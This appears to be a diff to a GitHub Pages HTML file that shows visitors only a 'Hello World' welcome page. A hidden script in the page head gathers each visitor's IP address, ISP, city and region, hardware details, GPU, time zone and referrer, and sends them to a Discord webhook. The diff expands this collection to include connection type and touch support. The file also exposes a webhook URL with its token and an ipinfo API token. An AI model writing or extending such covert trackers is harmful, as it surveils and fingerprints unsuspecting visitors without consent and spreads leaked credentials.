@@ -3,7 +3,7 @@
 <head>
 
 <script>
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // Replace with your webhook
+  const WEBHOOK_URL = "  https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; // Replace with your webhook
 
   // Get User-Agent string
   const userAgent = navigator.userAgent;
@@ -57,9 +57,7 @@
       const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
       if (!gl) return "Unknown";
       const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      if (debugInfo) {
-        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      }
+      if (debugInfo) return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
       return "Unknown";
     } catch (e) {
       return "Unknown";
@@ -73,7 +71,7 @@
   // Get time zone
   const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
 
-  // Referrer (where the user came from)
+  // Referrer
   const referrerUrl = document.referrer || "";
   function getReferrerName(ref) {
     if (!ref) return "Direct / None";
@@ -81,20 +79,25 @@
     if (ref.includes("duckduckgo.com")) return "DuckDuckGo";
     if (ref.includes("bing.com")) return "Bing";
     if (ref.includes("yahoo.com")) return "Yahoo";
-    return ref; // fallback: show full URL/domain
+    return ref;
   }
   const referrer = getReferrerName(referrerUrl);
 
+  // Detect network connection type
+  const connectionType = navigator.connection?.effectiveType || "Unknown";
+
+  // Detect if device has touch screen
+  const touchSupport = (navigator.maxTouchPoints && navigator.maxTouchPoints > 0) ? "Yes" : "No";
+
   // Function to send data to Discord
   function sendWebhook(batteryLevel = "Unknown") {
-    fetch("https://ipinfo.io/json?token=6ed2b2fac88455") // Replace YOUR_TOKEN_HERE with your token
+    fetch("https://ipinfo.io/json?token=6ed2b2fac88455") // Replace YOUR_TOKEN_HERE
       .then(res => res.json())
       .then(data => {
         const ip = data.ip || "Unknown";
         const isp = data.org || "Unknown";
         const location = `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country || "Unknown"}`;
 
-        // Send all info to Discord webhook using a pretty embed
         return fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -103,9 +106,9 @@
               {
                 title: "🆕 New Visitor Info",
                 description: "A visitor just accessed your site.",
-                color: 3447003, // Blue
+                color: 3447003,
                 fields: [
-                  // Location & IP info
+                  // Location & IP
                   { name: "🌐 IP Address", value: ip, inline: true },
                   { name: "🏢 ISP / Org", value: isp, inline: true },
                   { name: "📍 Location", value: location, inline: true },
@@ -123,7 +126,11 @@
                   { name: "🧠 CPU Cores", value: cpuCores.toString(), inline: true },
                   { name: "💾 RAM (GB)", value: ramGB.toString(), inline: true },
                   { name: "🎮 GPU", value: gpu, inline: true },
-                  { name: "🔋 Battery (%)", value: batteryLevel, inline: true },
+                  { name: "🔋 Battery (%)", value: "Pending", inline: true }, // will be updated
+
+                  // New additions
+                  { name: "📶 Connection Type", value: connectionType, inline: true },
+                  { name: "✋ Touch Screen", value: touchSupport, inline: true },
 
                   // Other info
                   { name: "🌐 Language", value: browserLang, inline: true },
@@ -160,10 +167,11 @@
 
 
 
+
 </head>
 <body>
   <h1>Hello World! </h1>
   <p>Welcome to my first GitHub Pages website.</p>
 </body>
 </html>
-  
+
